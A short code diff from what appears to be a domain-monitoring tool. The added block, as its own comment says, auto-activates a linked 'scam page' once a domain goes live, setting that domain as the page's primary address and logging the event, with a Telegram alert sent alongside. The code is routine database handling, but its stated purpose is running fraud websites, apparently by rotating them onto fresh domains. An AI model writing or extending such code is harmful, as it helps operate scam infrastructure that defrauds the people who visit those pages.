@@ -385,6 +385,24 @@ async function _checkUptime(domain) {
       updates.error_count   = 0;
       updates.error_message = null;
       await audit(domain.id, domain.domain, 'domain_live');
+
+      // Auto-activate the linked scam page and set this domain as its primary
+      if (domain.website_id) {
+        try {
+          const db      = getAdapter();
+          const website = await db.get('SELECT * FROM websites WHERE id = ?', [domain.website_id]);
+          if (website) {
+            await db.run(
+              'UPDATE websites SET is_active = 1, domain = ?, domain_active = 1 WHERE id = ?',
+              [domain.domain, domain.website_id]
+            );
+            await audit(domain.id, domain.domain, 'website_activated', {
+              website_id: domain.website_id, website_name: website.name,
+            });
+          }
+        } catch { /* non-fatal */ }
+      }
+
       sendTgAlert(
         '🟢 Domain Live',
         `<code>${domain.domain}</code> is now <b>live</b>!\n\n🔗 https://${domain.domain}`
